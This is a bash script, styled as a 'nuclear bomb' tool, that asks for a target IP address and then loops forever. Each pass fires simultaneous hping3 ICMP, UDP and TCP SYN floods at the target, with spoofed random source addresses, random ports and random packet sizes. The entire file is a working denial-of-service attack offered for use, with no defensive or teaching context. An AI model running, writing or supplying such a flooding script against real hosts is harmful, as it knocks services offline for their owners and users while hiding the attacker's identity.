#!/bin/bash

clear
echo -e "\e[1;31m======================================"
echo -e "      JALOPY NUCLEAR BOMB vFINAL SPOOFED"
echo -e "======================================\e[0m"
echo ""

read -p "Enter the target IP address: " target

echo ""
echo -e "\e[1;31mLaunching unstoppable spoofed nuclear flood on $target...\e[0m"
sleep 2

while true
do
    randport1=$(( ( RANDOM % 65535 )  + 1 ))
    randport2=$(( ( RANDOM % 65535 )  + 1 ))
    randport3=$(( ( RANDOM % 65535 )  + 1 ))
    packetsize=$(( ( RANDOM % 1400 )  + 100 ))

    echo -e "\e[1;32m[*] ICMP PING FLOOD (Large Packets: ${packetsize} bytes + random source IP)\e[0m"
    sudo hping3 -1 --flood --rand-source -d $packetsize -i u50 $target &

    echo -e "\e[1;33m[*] UDP FLOOD (Random Port: $randport1 + Spoofed IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -p $randport1 -d $packetsize $target &

    echo -e "\e[1;35m[*] TCP SYN FLOOD (Random Port: $randport2 + Spoofed IP)\e[0m"
    sudo hping3 -S --flood --rand-source -p $randport2 -d $packetsize $target &

    echo -e "\e[1;36m[*] SECOND UDP FLOOD (Random Port: $randport3 + Spoofed IP)\e[0m"
    sudo hping3 --udp --flood --rand-source -p $randport3 -d $packetsize -i u100 $target &

    sleep 5

    sudo pkill hping3
done
